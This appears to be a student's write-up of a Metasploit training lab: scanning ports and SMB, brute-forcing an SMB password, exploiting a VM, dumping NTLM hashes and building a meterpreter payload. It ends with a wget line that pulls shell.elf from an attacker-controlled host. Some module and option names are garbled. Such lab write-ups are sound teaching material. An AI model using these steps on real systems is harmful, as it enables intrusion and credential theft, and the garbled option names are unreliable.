Answer the questions below

a) How many ports are open on the target system?
- First we conduct a search portscan

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/32926ee5-ec5b-41cc-a25f-5086ce386d28)

- Next we go to the auxiliary portscan location and run a scan to it which shows the open ports, so we get 5 ports.

b) Using the relevant scanner, what NetBIOS name can you see?
- First we give a search netbios

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/ca6f0d68-3fc3-4d98-bdf8-3e97bdf8c19b)

- Then we add the RHOSTS to it and then go to the netbios/nbname group and then press run

c) What is running on port 8000?
- We entered search http_version

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/7a5edde1-96bb-49fd-96e8-3150c01a4649)

- We then added the RHOSTS and set the RPORT 8000 and run the file

d) What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
- First we go to sbi_login file

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/19140099-c7f7-4506-9ed6-7d37565f5828)

- set DB_ALL_PASS true and we set USERPASSFILE_FILE 'file location'

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/a00f0d23-19ad-41ad-b4e3-1c52e63b1ae7)

- and run the exploit

## Task - 3: The Metasploit Database
- The postresql systemctl is running

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/a616bd5e-b80e-4596-9925-b8780170d25f)

- Now we add a workspace

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/faf654b0-3a5a-4639-843d-a6fcaadbd861)

- Get information of the hosts

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/e316c7e7-c203-4718-a3c0-a2f0c0cea4c1)

- The services command used with the -S parameter will allow you to search for specific services in the environment.

## Task - 4: Vulnerability Scanning

- In the case of VNC, there are several scanner modules that we can use.

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/c3f70ef7-9536-472d-9d96-f06f81841a9c)

a) Who wrote the module that allows us to check SMTP servers for open relay?
- Campbell Murray



## Task - 5: Exploitation

a) Exploit one of the critical vulnerabilities on the target VM
-  A reverse payload will at least require you to set the LHOST option.

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/7f1b017f-b4d3-416e-9925-2d830ff4eff8)

- Thus found a vulnerable file

b) What is the content of the flag.txt file?
- First we enter into the location of

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/9a3639b6-d4e3-4d3e-9d8c-dedac176f211)

c) What is the NTLM hash of the password of the user "pirate"?
- Now we perform hash dump to get the hash of the password

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/4b34baa2-0c3b-4844-9135-24e93959a4d0)

## Task - 6: Msfvenom
- Msfvenom will allow you to access all payloads available in the  Metasploit framework.

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/cbda57c0-192b-4601-bb57-6f32b4a63ffd)

a) Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.

- Now we login to the remote system using username murphy and password.

b) Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).

![image](https://github.com/Akhilkj123/Cyber-Security/assets/65653010/6c5464de-22b6-4be5-95ea-179ce61ee6db)

c) Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_10.10.6.84:9000/shell.elf to download it to the target machine).
